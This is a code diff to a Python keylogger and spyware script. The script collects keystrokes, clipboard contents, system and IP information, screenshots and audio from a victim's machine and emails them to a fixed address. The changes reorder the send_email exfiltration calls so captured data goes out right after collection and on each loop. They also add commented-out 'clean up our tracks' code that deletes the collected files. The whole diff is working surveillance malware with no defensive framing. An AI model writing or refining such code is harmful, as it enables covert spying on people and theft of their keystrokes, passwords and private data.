@@ -95,7 +95,6 @@ def send_email(filename, attachment, toaddr):
 
     s.quit()
 
-    send_email(keys_information, file_path + extend + keys_information, toaddr)
 
 # get the computer information
 def computer_information():
@@ -116,6 +115,8 @@ def computer_information():
         f.write("Private IP Address: " + IPAddr + "\n")
 
 computer_information()
+send_email(system_information, file_path + extend + system_information, toaddr)
+
 
 # get the clipboard contents
 def copy_clipboard():
@@ -131,6 +132,7 @@ def copy_clipboard():
             f.write("Clipboard could be not be copied")
 
 copy_clipboard()
+send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
 
 # get the microphone
 def microphone():
@@ -200,17 +202,19 @@ while number_of_iterations < number_of_iterations_end:
 
     if currentTime > stoppingTime:
 
-        with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
+        # with open(file_path + extend + keys_information, "w") as f:
+        #    f.write(" ")
 
         screenshot()
         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
 
-        copy_clipboard()
-        send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
+        send_email(keys_information, file_path + extend + keys_information, toaddr)
 
-        computer_information()
-        send_email(system_information, file_path + extend + system_information, toaddr)
+        #copy_clipboard()
+        #send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
+
+        #computer_information()
+        #send_email(system_information, file_path + extend + system_information, toaddr)
 
         number_of_iterations += 1
 
@@ -226,6 +230,14 @@ count = 0
 
 send_email(files_to_encrypt[count], files_to_encrypt[count], toaddr)
 count += 1
+'''
+
+
+'''
+# Clean up our tracks and delete files
+delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+for file in delete_files:
+    os.remove(file_merge + file)
 '''
 
 time.sleep(120)
